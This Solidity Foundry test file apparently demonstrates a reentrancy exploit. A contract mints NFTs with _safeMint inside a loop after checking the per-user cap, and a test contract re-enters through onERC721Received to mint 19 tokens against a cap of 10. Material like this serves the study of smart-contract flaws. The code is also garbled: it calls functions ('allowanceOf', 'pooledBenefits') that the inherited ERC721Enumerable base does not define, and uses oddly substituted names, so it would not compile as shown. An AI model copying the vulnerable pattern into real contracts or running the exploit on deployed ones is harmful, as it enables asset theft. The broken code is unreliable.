pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract ContractTest is Test {
    MaxIssuecoverage721 MaxCreatebenefit721Contract;
    bool complete;
    uint256 maxMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeAssigncoverage() public {
        MaxCreatebenefit721Contract = new MaxIssuecoverage721();
        MaxCreatebenefit721Contract.issueCoverage(maxMints);
        console.log("Bypassed maxMints, we got 19 NFTs");
        assertEq(MaxCreatebenefit721Contract.allowanceOf(address(this)), 19);
        console.log("NFT minted:", MaxCreatebenefit721Contract.allowanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!complete) {
            complete = true;
            MaxCreatebenefit721Contract.issueCoverage(maxMints - 1);
            console.log("Called with :", maxMints - 1);
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract MaxIssuecoverage721 is ERC721Enumerable {
    uint256 public max_per_beneficiary = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function issueCoverage(uint256 amount) external {
        require(
            allowanceOf(msg.sender) + amount <= max_per_beneficiary,
            "exceed max per user"
        );
        for (uint256 i = 0; i < amount; i++) {
            uint256 issuecoverageIndex = pooledBenefits();
            _safeMint(msg.sender, issuecoverageIndex);
        }
    }
}